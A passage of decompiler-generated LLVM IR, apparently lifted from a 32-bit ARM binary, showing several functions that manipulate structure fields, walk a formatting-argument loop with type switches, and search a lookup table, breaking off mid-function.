  %v2_1360c = load i8, i8* %v1_1360c, align 1
  %v3_1360c = zext i8 %v2_1360c to i32
  store i32 %v3_1360c, i32* %r0.global-to-local, align 4
  %v2_13610 = icmp eq i8 %v2_1360c, 0
  br i1 %v2_13610, label %dec_label_pc_1360c.dec_label_pc_13618_crit_edge, label %dec_label_pc_135d4

dec_label_pc_1360c.dec_label_pc_13618_crit_edge:  ; preds = %dec_label_pc_1360c.backedge
  %v0_13618.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13618

dec_label_pc_13618:                               ; preds = %dec_label_pc_1360c.dec_label_pc_13618_crit_edge, %dec_label_pc_135cc
  %v0_13618 = phi i32 [ %v0_13618.pre, %dec_label_pc_1360c.dec_label_pc_13618_crit_edge ], [ %v0_135cc, %dec_label_pc_135cc ]
  %v1_13618 = load i32, i32* @r4, align 4
  %v2_13618 = inttoptr i32 %v1_13618 to i32*
  store i32 %v0_13618, i32* %v2_13618, align 4
  %v1_13624.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1361c

dec_label_pc_1361c.loopexit:                      ; preds = %dec_label_pc_135e8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1361c

dec_label_pc_1361c:                               ; preds = %dec_label_pc_1361c.loopexit, %dec_label_pc_13618
  %v1_13624 = phi i32 [ -1, %dec_label_pc_1361c.loopexit ], [ %v1_13624.pre, %dec_label_pc_13618 ]
  store i32 %v3_13588, i32* @r4, align 4
  store i32 %v6_13588, i32* @r5, align 4
  ret i32 %v1_13624

; uselistorder directives
  uselistorder i32 %v3_1360c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_135cc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_135c4, { 1, 0 }
  uselistorder i32 %v0_135c0.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 4, 1, 7, 3, 2, 0, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 5, 6, 3, 1, 7, 0 }
  uselistorder i32 152, { 1, 0 }
  uselistorder label %dec_label_pc_13608, { 1, 0 }
  uselistorder label %dec_label_pc_135d4, { 1, 0 }
  uselistorder label %dec_label_pc_135c0.dec_label_pc_135c0_crit_edge, { 1, 0 }
}

define i32 @function_13628(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13628:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13628 = load i32, i32* @r4, align 4
  store i32 %v3_13628, i32* %stack_var_-12, align 4
  %v0_1362c = load i32, i32* @r0, align 4
  %v1_1362c = add i32 %v0_1362c, 24
  %v2_1362c = inttoptr i32 %v1_1362c to i32*
  %v3_1362c = load i32, i32* %v2_1362c, align 4
  store i32 %v3_1362c, i32* %r5.global-to-local, align 4
  store i32 %v0_1362c, i32* @r4, align 4
  %v2_1363c = add i32 %v0_1362c, 76
  %v3_1363c = inttoptr i32 %v2_1363c to i32*
  store i32 %arg2, i32* %v3_1363c, align 4
  %tmp5 = icmp slt i32 %v3_1362c, 1
  br i1 %tmp5, label %dec_label_pc_13660, label %dec_label_pc_13644

dec_label_pc_13644:                               ; preds = %dec_label_pc_13628
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13648 = load i32, i32* @r0, align 4
  %v2_13648 = add i32 %v1_13648, 8
  %v3_13648 = inttoptr i32 %v2_13648 to i32*
  store i32 0, i32* %v3_13648, align 4
  %v0_1364c = load i32, i32* %r5.global-to-local, align 4
  %v1_1364c = load i32, i32* @r0, align 4
  %v2_1364c = add i32 %v1_1364c, 28
  %v3_1364c = inttoptr i32 %v2_1364c to i32*
  store i32 %v0_1364c, i32* %v3_1364c, align 4
  %v0_13650 = load i32, i32* %r3.global-to-local, align 4
  %v1_13650 = load i32, i32* @r0, align 4
  %v2_13650 = add i32 %v1_13650, 24
  %v3_13650 = inttoptr i32 %v2_13650 to i32*
  store i32 %v0_13650, i32* %v3_13650, align 4
  %v0_13654 = load i32, i32* %r3.global-to-local, align 4
  %v1_13654 = load i32, i32* @r0, align 4
  %v2_13654 = add i32 %v1_13654, 4
  %v3_13654 = inttoptr i32 %v2_13654 to i32*
  store i32 %v0_13654, i32* %v3_13654, align 4
  %v0_13658 = call i32 @function_1366c()
  store i32 %v0_13658, i32* @r0, align 4
  %v0_1365c = load i32, i32* %r5.global-to-local, align 4
  %v1_1365c = load i32, i32* @r4, align 4
  %v2_1365c = add i32 %v1_1365c, 24
  %v3_1365c = inttoptr i32 %v2_1365c to i32*
  store i32 %v0_1365c, i32* %v3_1365c, align 4
  br label %dec_label_pc_13660

dec_label_pc_13660:                               ; preds = %dec_label_pc_13628, %dec_label_pc_13644
  %v2_13664 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13664, i32* @r4, align 4
  %v1_13668 = load i32, i32* @r0, align 4
  ret i32 %v1_13668

; uselistorder directives
  uselistorder i32 %v0_1362c, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_1366c, { 1, 0 }
  uselistorder label %dec_label_pc_13660, { 1, 0 }
}

define i32 @function_1366c() local_unnamed_addr {
dec_label_pc_1366c:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_1366c = load i32, i32* @r0, align 4
  %v1_1366c = add i32 %v0_1366c, 24
  %v2_1366c = inttoptr i32 %v1_1366c to i32*
  %v3_1366c = load i32, i32* %v2_1366c, align 4
  store i32 %v3_1366c, i32* %r1.global-to-local, align 4
  %v2_13670 = icmp eq i32 %v3_1366c, 0
  %v3_13674 = load i32, i32* @r4, align 4
  store i32 %v3_13674, i32* %stack_var_-8, align 4
  %v1_13678 = add i32 %v0_1366c, 8
  %v2_13678 = inttoptr i32 %v1_13678 to i32*
  %v3_13678 = load i32, i32* %v2_13678, align 4
  store i32 %v3_13678, i32* %r3.global-to-local, align 4
  %v6_13680 = icmp eq i32 %v3_13678, -2147483648
  br i1 %v2_13670, label %dec_label_pc_13680, label %dec_label_pc_137b8

dec_label_pc_13680:                               ; preds = %dec_label_pc_1366c
  br i1 %v6_13680, label %dec_label_pc_13688, label %dec_label_pc_136a0

dec_label_pc_13688:                               ; preds = %dec_label_pc_13680
  %v1_13688 = add i32 %v0_1366c, 76
  %v2_13688 = inttoptr i32 %v1_13688 to i32*
  %v3_13688 = load i32, i32* %v2_13688, align 4
  store i32 %v3_13688, i32* %r3.global-to-local, align 4
  %v1_1368c = inttoptr i32 %v3_13688 to i32*
  %v2_1368c = load i32, i32* %v1_1368c, align 4
  store i32 %v2_1368c, i32* %r2.global-to-local, align 4
  %v1_13690 = add i32 %v3_13688, 4
  store i32 %v1_13690, i32* %r3.global-to-local, align 4
  store i32 %v1_13690, i32* %v2_13688, align 4
  %v0_13698 = load i32, i32* %r2.global-to-local, align 4
  %v1_13698 = load i32, i32* @r0, align 4
  %v2_13698 = add i32 %v1_13698, 8
  %v3_13698 = inttoptr i32 %v2_13698 to i32*
  store i32 %v0_13698, i32* %v3_13698, align 4
  %v0_1369c = load i32, i32* %r2.global-to-local, align 4
  %v1_1369c = load i32, i32* @r0, align 4
  %v2_1369c = add i32 %v1_1369c, 80
  %v3_1369c = inttoptr i32 %v2_1369c to i32*
  store i32 %v0_1369c, i32* %v3_1369c, align 4
  %v0_136a0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_136a0

dec_label_pc_136a0:                               ; preds = %dec_label_pc_13680, %dec_label_pc_13688
  %v1_136bc = phi i32 [ %v0_1366c, %dec_label_pc_13680 ], [ %v0_136a0.pre, %dec_label_pc_13688 ]
  %v1_136a0 = add i32 %v1_136bc, 4
  %v2_136a0 = inttoptr i32 %v1_136a0 to i32*
  %v3_136a0 = load i32, i32* %v2_136a0, align 4
  store i32 %v3_136a0, i32* %r3.global-to-local, align 4
  %v6_136a4 = icmp eq i32 %v3_136a0, -2147483648
  %v1_136a8 = add i32 %v1_136bc, 80
  store i32 %v1_136a8, i32* %ip.global-to-local, align 4
  br i1 %v6_136a4, label %dec_label_pc_136b0, label %dec_label_pc_136c8

dec_label_pc_136b0:                               ; preds = %dec_label_pc_136a0
  %v1_136b0 = add i32 %v1_136bc, 76
  %v2_136b0 = inttoptr i32 %v1_136b0 to i32*
  %v3_136b0 = load i32, i32* %v2_136b0, align 4
  store i32 %v3_136b0, i32* %r3.global-to-local, align 4
  %v1_136b4 = inttoptr i32 %v3_136b0 to i32*
  %v2_136b4 = load i32, i32* %v1_136b4, align 4
  store i32 %v2_136b4, i32* %r2.global-to-local, align 4
  %v1_136b8 = add i32 %v3_136b0, 4
  store i32 %v1_136b8, i32* %r3.global-to-local, align 4
  store i32 %v1_136b8, i32* %v2_136b0, align 4
  %v0_136c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_136c0 = load i32, i32* @r0, align 4
  %v2_136c0 = add i32 %v1_136c0, 4
  %v3_136c0 = inttoptr i32 %v2_136c0 to i32*
  store i32 %v0_136c0, i32* %v3_136c0, align 4
  %v0_136c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_136c4 = load i32, i32* @r0, align 4
  %v2_136c4 = add i32 %v1_136c4, 80
  %v3_136c4 = inttoptr i32 %v2_136c4 to i32*
  store i32 %v0_136c4, i32* %v3_136c4, align 4
  %v0_137a817.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_136c8

dec_label_pc_136c8:                               ; preds = %dec_label_pc_136a0, %dec_label_pc_136b0
  %v0_137a817 = phi i32 [ %v1_136bc, %dec_label_pc_136a0 ], [ %v0_137a817.pre, %dec_label_pc_136b0 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_136cc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_136cc, i32* %lr.global-to-local, align 4
  %v1_137a818 = add i32 %v0_137a817, 28
  %v2_137a819 = inttoptr i32 %v1_137a818 to i32*
  %v3_137a820 = load i32, i32* %v2_137a819, align 4
  store i32 %v3_137a820, i32* %r3.global-to-local, align 4
  %v5_137b022 = icmp slt i32 %v0_136cc, %v3_137a820
  br i1 %v5_137b022, label %dec_label_pc_136d4, label %dec_label_pc_137b4.loopexit

dec_label_pc_136d4:                               ; preds = %dec_label_pc_136c8, %dec_label_pc_137a8.backedge
  %v0_137a824 = phi i32 [ %v0_137a8, %dec_label_pc_137a8.backedge ], [ %v0_137a817, %dec_label_pc_136c8 ]
  %v0_136e023 = phi i32 [ %v0_136e0.be, %dec_label_pc_137a8.backedge ], [ %v0_136cc, %dec_label_pc_136c8 ]
  %v4_136d4 = mul i32 %v0_136e023, 4
  %v5_136d4 = add i32 %v4_136d4, %v0_137a824
  store i32 %v5_136d4, i32* %r3.global-to-local, align 4
  %v1_136d8 = add i32 %v5_136d4, 40
  %v2_136d8 = inttoptr i32 %v1_136d8 to i32*
  %v3_136d8 = load i32, i32* %v2_136d8, align 4
  store i32 %v3_136d8, i32* %r3.global-to-local, align 4
  %v7_136dc = icmp eq i32 %v3_136d8, 8
  %v1_136e0 = add i32 %v0_136e023, 1
  store i32 %v1_136e0, i32* %lr.global-to-local, align 4
  br i1 %v7_136dc, label %dec_label_pc_137a8.backedge, label %dec_label_pc_136e8

dec_label_pc_136e8:                               ; preds = %dec_label_pc_136d4
  %v1_136e8 = add i32 %v0_137a824, 76
  %v2_136e8 = inttoptr i32 %v1_136e8 to i32*
  %v3_136e8 = load i32, i32* %v2_136e8, align 4
  store i32 %v3_136e8, i32* %r1.global-to-local, align 4
  %v8_136ec = icmp sgt i32 %v3_136d8, 8
  br i1 %v8_136ec, label %dec_label_pc_13710, label %dec_label_pc_136f0

dec_label_pc_136f0:                               ; preds = %dec_label_pc_136e8
  %v7_136f0 = icmp eq i32 %v3_136d8, 2
  br i1 %v7_136f0, label %dec_label_pc_13760, label %dec_label_pc_136f8

dec_label_pc_136f8:                               ; preds = %dec_label_pc_136f0
  %v8_136f8 = icmp sgt i32 %v3_136d8, 2
  br i1 %v8_136f8, label %dec_label_pc_13708, label %dec_label_pc_136fc

dec_label_pc_136fc:                               ; preds = %dec_label_pc_136f8
  %v1_136fc = icmp slt i32 %v3_136d8, 0
  br i1 %v1_136fc, label %dec_label_pc_13794, label %dec_label_pc_13760

dec_label_pc_13708:                               ; preds = %dec_label_pc_136f8
  %v7_13708 = icmp eq i32 %v3_136d8, 7
  br i1 %v7_13708, label %dec_label_pc_13774, label %dec_label_pc_13794

dec_label_pc_13710:                               ; preds = %dec_label_pc_136e8
  %v7_13710 = icmp eq i32 %v3_136d8, 1024
  br i1 %v7_13710, label %dec_label_pc_13760, label %dec_label_pc_13718

dec_label_pc_13718:                               ; preds = %dec_label_pc_13710
  %v8_13718 = icmp sgt i32 %v3_136d8, 1024
  br i1 %v8_13718, label %dec_label_pc_13730, label %dec_label_pc_1371c

dec_label_pc_1371c:                               ; preds = %dec_label_pc_13718
  switch i32 %v3_136d8, label %dec_label_pc_13794 [
    i32 256, label %dec_label_pc_13760
    i32 512, label %dec_label_pc_13760
  ]

dec_label_pc_13730:                               ; preds = %dec_label_pc_13718
  %v7_13730 = icmp eq i32 %v3_136d8, 2048
  br i1 %v7_13730, label %dec_label_pc_13744, label %dec_label_pc_1373c

dec_label_pc_1373c:                               ; preds = %dec_label_pc_13730
  %v1_13738 = load i32, i32* %r4.global-to-local, align 4
  %v9_13738 = icmp eq i32 %v3_136d8, %v1_13738
  br i1 %v9_13738, label %dec_label_pc_13774, label %dec_label_pc_13794

dec_label_pc_13744:                               ; preds = %dec_label_pc_13730
  %v1_13744 = add i32 %v3_136e8, 7
  %v1_13748 = and i32 %v1_13744, -8
  store i32 %v1_13748, i32* %r3.global-to-local, align 4
  %v1_1374c = inttoptr i32 %v1_13748 to i32*
  %v2_1374c = load i32, i32* %v1_1374c, align 8
  store i32 %v2_1374c, i32* %r1.global-to-local, align 4
  %v3_1374c = or i32 %v1_13748, 4
  %v4_1374c = inttoptr i32 %v3_1374c to i32*
  %v5_1374c = load i32, i32* %v4_1374c, align 4
  store i32 %v5_1374c, i32* %r2.global-to-local, align 4
  %v1_13750 = add i32 %v1_13748, 8
  store i32 %v1_13750, i32* %r3.global-to-local, align 4
  store i32 %v1_13750, i32* %v2_136e8, align 4
  %v0_13758 = load i32, i32* %ip.global-to-local, align 4
  %v1_13758 = inttoptr i32 %v0_13758 to i32*
  %v2_13758 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13758, i32* %v1_13758, align 4
  %v3_13758 = add i32 %v0_13758, 4
  %v4_13758 = inttoptr i32 %v3_13758 to i32*
  %v5_13758 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_13758, i32* %v4_13758, align 4
  br label %dec_label_pc_137a4

dec_label_pc_13760:                               ; preds = %dec_label_pc_1371c, %dec_label_pc_1371c, %dec_label_pc_136fc, %dec_label_pc_13710, %dec_label_pc_136f0
  %v1_13760 = inttoptr i32 %v3_136e8 to i32*
  %v2_13760 = load i32, i32* %v1_13760, align 4
  store i32 %v2_13760, i32* %r2.global-to-local, align 4
  %v1_13764 = add i32 %v3_136e8, 4
  store i32 %v1_13764, i32* %r3.global-to-local, align 4
  store i32 %v1_13764, i32* %v2_136e8, align 4
  %v0_1376c = load i32, i32* %r2.global-to-local, align 4
  %v1_1376c = load i32, i32* %ip.global-to-local, align 4
  %v2_1376c = inttoptr i32 %v1_1376c to i32*
  store i32 %v0_1376c, i32* %v2_1376c, align 4
  br label %dec_label_pc_137a4

dec_label_pc_13774:                               ; preds = %dec_label_pc_13708, %dec_label_pc_1373c
  %v3_13774 = load i32, i32* %v2_136e8, align 4
  %v1_13778 = add i32 %v3_13774, 7
  %v1_1377c = and i32 %v1_13778, -8
  store i32 %v1_1377c, i32* %r3.global-to-local, align 4
  %v1_13780 = inttoptr i32 %v1_1377c to i32*
  %v2_13780 = load i32, i32* %v1_13780, align 8
  store i32 %v2_13780, i32* %r1.global-to-local, align 4
  %v3_13780 = or i32 %v1_1377c, 4
  %v4_13780 = inttoptr i32 %v3_13780 to i32*
  %v5_13780 = load i32, i32* %v4_13780, align 4
  store i32 %v5_13780, i32* %r2.global-to-local, align 4
  %v1_13784 = add i32 %v1_1377c, 8
  store i32 %v1_13784, i32* %r3.global-to-local, align 4
  store i32 %v1_13784, i32* %v2_136e8, align 4
  %v0_1378c = load i32, i32* %ip.global-to-local, align 4
  %v1_1378c = inttoptr i32 %v0_1378c to i32*
  %v2_1378c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_1378c, i32* %v1_1378c, align 4
  %v3_1378c = add i32 %v0_1378c, 4
  %v4_1378c = inttoptr i32 %v3_1378c to i32*
  %v5_1378c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1378c, i32* %v4_1378c, align 4
  br label %dec_label_pc_137a4

dec_label_pc_13794:                               ; preds = %dec_label_pc_1371c, %dec_label_pc_13708, %dec_label_pc_136fc, %dec_label_pc_1373c
  %v1_13794 = add i32 %v3_136e8, 4
  store i32 %v1_13794, i32* %r3.global-to-local, align 4
  store i32 %v1_13794, i32* %v2_136e8, align 4
  %v0_1379c = load i32, i32* %r1.global-to-local, align 4
  %v1_1379c = inttoptr i32 %v0_1379c to i32*
  %v2_1379c = load i32, i32* %v1_1379c, align 4
  store i32 %v2_1379c, i32* %r3.global-to-local, align 4
  %v1_137a0 = load i32, i32* %ip.global-to-local, align 4
  %v2_137a0 = inttoptr i32 %v1_137a0 to i32*
  store i32 %v2_1379c, i32* %v2_137a0, align 4
  br label %dec_label_pc_137a4

dec_label_pc_137a4:                               ; preds = %dec_label_pc_13774, %dec_label_pc_13760, %dec_label_pc_13744, %dec_label_pc_13794
  %v0_137a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_137a4 = add i32 %v0_137a4, 8
  store i32 %v1_137a4, i32* %ip.global-to-local, align 4
  %v0_137ac.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_137a8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_137a8.backedge

dec_label_pc_137a8.backedge:                      ; preds = %dec_label_pc_137a4, %dec_label_pc_136d4
  %v0_137a8 = phi i32 [ %v0_137a8.pre, %dec_label_pc_137a4 ], [ %v0_137a824, %dec_label_pc_136d4 ]
  %v0_136e0.be = phi i32 [ %v0_137ac.pre.pre, %dec_label_pc_137a4 ], [ %v1_136e0, %dec_label_pc_136d4 ]
  %v1_137a8 = add i32 %v0_137a8, 28
  %v2_137a8 = inttoptr i32 %v1_137a8 to i32*
  %v3_137a8 = load i32, i32* %v2_137a8, align 4
  store i32 %v3_137a8, i32* %r3.global-to-local, align 4
  %v5_137b0 = icmp slt i32 %v0_136e0.be, %v3_137a8
  br i1 %v5_137b0, label %dec_label_pc_136d4, label %dec_label_pc_137a8.dec_label_pc_137b4.loopexit_crit_edge

dec_label_pc_137b8:                               ; preds = %dec_label_pc_1366c
  br i1 %v6_13680, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_137b8
  %v2_137bc = add i32 %v0_1366c, 36
  %v3_137bc = inttoptr i32 %v2_137bc to i8*
  %v4_137bc = load i8, i8* %v3_137bc, align 1
  %v5_137bc = zext i8 %v4_137bc to i32
  %v5_137c0 = mul nuw nsw i32 %v5_137bc, 8
  %v6_137c0 = add i32 %v5_137c0, %v0_1366c
  store i32 %v6_137c0, i32* %r3.global-to-local, align 4
  %v2_137c4 = add i32 %v6_137c0, 72
  %v3_137c4 = inttoptr i32 %v2_137c4 to i32*
  %v4_137c4 = load i32, i32* %v3_137c4, align 4
  store i32 %v4_137c4, i32* %r3.global-to-local, align 4
  store i32 %v4_137c4, i32* %v2_13678, align 4
  %v0_137cc.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_137b8, %bb
  %v2_137e0 = phi i32 [ %v0_137cc.pre, %bb ], [ %v0_1366c, %dec_label_pc_137b8 ]
  %v1_137cc = add i32 %v2_137e0, 4
  %v2_137cc = inttoptr i32 %v1_137cc to i32*
  %v3_137cc = load i32, i32* %v2_137cc, align 4
  store i32 %v3_137cc, i32* %r3.global-to-local, align 4
  %v6_137d0 = icmp eq i32 %v3_137cc, -2147483648
  br i1 %v6_137d0, label %bb16, label %dec_label_pc_137b4

bb16:                                             ; preds = %.thread1
  %v2_137d4 = add i32 %v2_137e0, 37
  %v3_137d4 = inttoptr i32 %v2_137d4 to i8*
  %v4_137d4 = load i8, i8* %v3_137d4, align 1
  %v5_137d4 = zext i8 %v4_137d4 to i32
  %v5_137d8 = mul nuw nsw i32 %v5_137d4, 8
  %v6_137d8 = add i32 %v5_137d8, %v2_137e0
  store i32 %v6_137d8, i32* %r3.global-to-local, align 4
  %v2_137dc = add i32 %v6_137d8, 72
  %v3_137dc = inttoptr i32 %v2_137dc to i32*
  %v4_137dc = load i32, i32* %v3_137dc, align 4
  store i32 %v4_137dc, i32* %r3.global-to-local, align 4
  store i32 %v4_137dc, i32* %v2_137cc, align 4
  %v0_137e4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_137b4

dec_label_pc_137a8.dec_label_pc_137b4.loopexit_crit_edge: ; preds = %dec_label_pc_137a8.backedge
  br label %dec_label_pc_137b4.loopexit

dec_label_pc_137b4.loopexit:                      ; preds = %dec_label_pc_137a8.dec_label_pc_137b4.loopexit_crit_edge, %dec_label_pc_136c8
  %v0_137a8.lcssa = phi i32 [ %v0_137a8, %dec_label_pc_137a8.dec_label_pc_137b4.loopexit_crit_edge ], [ %v0_137a817, %dec_label_pc_136c8 ]
  br label %dec_label_pc_137b4

dec_label_pc_137b4:                               ; preds = %dec_label_pc_137b4.loopexit, %.thread1, %bb16
  %v1_13804 = phi i32 [ %v0_137a8.lcssa, %dec_label_pc_137b4.loopexit ], [ %v2_137e0, %.thread1 ], [ %v0_137e4.pre, %bb16 ]
  %v1_137e4 = add i32 %v1_13804, 8
  %v2_137e4 = inttoptr i32 %v1_137e4 to i32*
  %v3_137e4 = load i32, i32* %v2_137e4, align 4
  store i32 %v3_137e4, i32* %r1.global-to-local, align 4
  %v1_137e8 = icmp slt i32 %v3_137e4, 0
  br i1 %v1_137e8, label %dec_label_pc_137f0, label %dec_label_pc_13810

dec_label_pc_137f0:                               ; preds = %dec_label_pc_137b4
  %v1_137f0 = add i32 %v1_13804, 16
  %v2_137f0 = inttoptr i32 %v1_137f0 to i32*
  %v3_137f0 = load i32, i32* %v2_137f0, align 4
  %v1_137f8 = sub i32 0, %v3_137e4
  store i32 %v1_137f8, i32* %r1.global-to-local, align 4
  %v1_137f4 = and i32 %v3_137f0, -10
  %v1_137fc = or i32 %v1_137f4, 8
  store i32 %v1_137fc, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_13804 = add i32 %v1_13804, 20
  %v3_13804 = inttoptr i32 %v2_13804 to i32*
  store i32 32, i32* %v3_13804, align 4
  %v0_13808 = load i32, i32* %r1.global-to-local, align 4
  %v1_13808 = load i32, i32* @r0, align 4
  %v2_13808 = add i32 %v1_13808, 8
  %v3_13808 = inttoptr i32 %v2_13808 to i32*
  store i32 %v0_13808, i32* %v3_13808, align 4
  %v0_1380c = load i32, i32* %r3.global-to-local, align 4
  %v1_1380c = load i32, i32* @r0, align 4
  %v2_1380c = add i32 %v1_1380c, 16
  %v3_1380c = inttoptr i32 %v2_1380c to i32*
  store i32 %v0_1380c, i32* %v3_1380c, align 4
  %v1_13814.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13810

dec_label_pc_13810:                               ; preds = %dec_label_pc_137b4, %dec_label_pc_137f0
  %v1_13814 = phi i32 [ %v1_13804, %dec_label_pc_137b4 ], [ %v1_13814.pre, %dec_label_pc_137f0 ]
  %v2_13810 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13810, i32* @r4, align 4
  ret i32 %v1_13814

; uselistorder directives
  uselistorder i32 %v2_137e0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_136e0.be, { 1, 0 }
  uselistorder i32 %v0_137a8, { 1, 2, 0 }
  uselistorder i32 %v3_136e8, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_136e8, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_136d8, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_136e023, { 1, 0 }
  uselistorder i32 %v0_137a824, { 0, 2, 1 }
  uselistorder i32 %v0_137a817, { 2, 0, 1 }
  uselistorder i32 %v0_1366c, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_13810, { 1, 0 }
  uselistorder label %dec_label_pc_137b4, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_137a4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13794, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13774, { 1, 0 }
  uselistorder label %dec_label_pc_13760, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_136d4, { 1, 0 }
  uselistorder label %dec_label_pc_136c8, { 1, 0 }
  uselistorder label %dec_label_pc_136a0, { 1, 0 }
}

define i32 @function_1381c() local_unnamed_addr {
dec_label_pc_1381c:
  %v1_13838.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13834

dec_label_pc_13834:                               ; preds = %dec_label_pc_13840, %dec_label_pc_1381c
  %v0_13834 = phi i32 [ %v1_13834, %dec_label_pc_13840 ], [ ptrtoint (i32* @global_var_22c9a.718 to i32), %dec_label_pc_1381c ]
  %v1_13834 = add i32 %v0_13834, -2
  %v2_13834 = inttoptr i32 %v1_13834 to i16*
  %v3_13834 = load i16, i16* %v2_13834, align 2
  %v4_13834 = sext i16 %v3_13834 to i32
  store i32 %v1_13834, i32* @ip, align 4
  %v9_13838 = icmp eq i32 %v4_13834, %v1_13838.pre
  br i1 %v9_13838, label %dec_label_pc_13834.dec_label_pc_13848_crit_edge, label %dec_label_pc_13840

dec_label_pc_13834.dec_label_pc_13848_crit_edge:  ; preds = %dec_label_pc_13834
  br label %dec_label_pc_13848

dec_label_pc_13840:                               ; preds = %dec_label_pc_13834
  %tmp = icmp ugt i32 %v1_13834, ptrtoint (i32* @global_var_22c82.717 to i32)
  br i1 %tmp, label %dec_label_pc_13834, label %dec_label_pc_13848.loopexit

dec_label_pc_13848.loopexit:                      ; preds = %dec_label_pc_13840
  br label %dec_label_pc_13848

dec_label_pc_13848:                               ; preds = %dec_label_pc_13848.loopexit, %dec_label_pc_13834.dec_label_pc_13848_crit_edge
  %v2_13858.pre-phi = sub i32 %v1_13834, ptrtoint (i32* @global_var_22c82.717 to i32)
  store i32 %v2_13858.pre-phi, i32* @r2, align 4
  %v4_1385c = sdiv i32 %v2_13858.pre-phi, 2
  %v5_1385c = add i32 %v4_1385c, ptrtoint (i32* @global_var_22c9a.718 to i32)
  %v6_1385c = inttoptr i32 %v5_1385c to i8*
  %v7_1385c = load i8, i8* %v6_1385c, align 1
  %v9_1385c = zext i8 %v7_1385c to i32
  ret i32 %v9_1385c

; uselistorder directives
  uselistorder i32 %v2_13858.pre-phi, { 1, 0 }
  uselistorder i32 %v1_13834, { 0, 1, 3, 4, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_22c9a.718 to i32), { 1, 0 }
}

define i32 @function_13870(i8* %arg1) local_unnamed_addr {
dec_label_pc_13870:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp115 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13870 = load i32, i32* @r4, align 4
  store i32 %v3_13870, i32* %stack_var_-36, align 4
  %v6_13870 = load i32, i32* @r5, align 4
  %v27_13870 = load i32, i32* @lr, align 4
  %v0_13874 = load i32, i32* %r0.global-to-local, align 4
  %v1_13874 = add i32 %v0_13874, 16
  %v2_13874 = inttoptr i32 %v1_13874 to i32*
  %v3_13874 = load i32, i32* %v2_13874, align 4
  %v1_1387c = and i32 %v3_13874, 128
  store i32 %v1_1387c, i32* @r4, align 4
  %v2_1387c = icmp eq i32 %v1_1387c, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_13874, i32* %r7.global-to-local, align 4
  store i32 180260, i32* @lr, align 4
  %v1_138a4 = add i32 %v0_13874, 24
